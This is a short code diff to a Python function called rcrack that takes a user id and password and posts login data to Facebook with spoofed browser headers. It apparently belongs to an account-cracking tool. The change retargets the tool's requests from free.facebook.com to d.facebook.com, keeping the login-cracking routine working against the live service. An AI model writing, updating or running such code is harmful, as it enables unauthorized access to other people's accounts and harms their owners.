@@ -364,7 +364,7 @@ def rcrack(uid,pwx,tl):
 
             session = requests.Session()
 
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://d.facebook.com').text
 
             log_data = {
 
@@ -386,7 +386,7 @@ def rcrack(uid,pwx,tl):
 
             "login":"Log In"}
 
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'd.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
